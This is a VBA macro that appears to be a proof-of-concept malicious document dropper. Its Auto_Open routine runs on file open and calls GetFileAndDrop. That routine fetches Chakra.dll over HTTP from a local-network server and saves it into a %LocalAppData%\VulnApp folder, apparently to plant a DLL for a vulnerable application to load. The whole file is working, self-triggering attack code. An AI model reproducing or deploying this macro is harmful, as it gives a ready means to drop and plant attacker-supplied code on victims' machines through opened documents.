Sub GetFileAndDrop()
    Dim URL As String
    Dim WinHttpReq As Object
    Dim fso As Object
    Dim ts As Object
    Dim folderPath As String
    Dim fileName As String
    Dim fullPath As String

    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
    
    URL = "http://192.168.1.6:8000/Chakra.dll"
    folderPath = "%LocalAppData%\VulnApp" ' replace with your path
    
     ' Replace environment variables in the folderPath
    Dim envVarStart As Integer
    Dim envVarEnd As Integer
    Dim envVar As String
    envVarStart = InStr(folderPath, "%")
    While envVarStart > 0
        envVarEnd = InStr(envVarStart + 1, folderPath, "%")
        envVar = Mid(folderPath, envVarStart + 1, envVarEnd - envVarStart - 1)
        folderPath = Replace(folderPath, "%" & envVar & "%", Environ(envVar))
        envVarStart = InStr(envVarEnd + 1, folderPath, "%")
    Wend


    ' Check if folderPath ends with "\"
    If Right(folderPath, 1) <> "\" Then
        folderPath = folderPath & "\"
    End If

    ' Extract filename from URL
    fileName = Mid(URL, InStrRev(URL, "/") + 1)
    fullPath = folderPath & fileName

    ' Print fullPath in a MessageBox
    'MsgBox fullPath

    ' Send the HTTP GET request
    WinHttpReq.Open "GET", URL, False
    WinHttpReq.send

    If WinHttpReq.Status = 200 Then
        Dim File() As Byte
        File = WinHttpReq.responseBody

        ' Create an instance of ADODB.Stream
        Dim Stream As Object
        Set Stream = CreateObject("ADODB.Stream")

        ' Specify stream type - we want to save binary data.
        Stream.Type = 1 ' 1 = binary
        Stream.Open

        ' Write binary data to the stream.
        Stream.Write File

        ' Save binary data to the file
        Stream.SaveToFile fullPath, 2 ' 2 = overwrite

        ' Close the stream
        Stream.Close

    Else
        MsgBox "HTTP GET request failed. Status: " & WinHttpReq.Status & " " & WinHttpReq.statusText
    End If
End Sub

Sub Auto_Open()
    GetFileAndDrop
End Sub
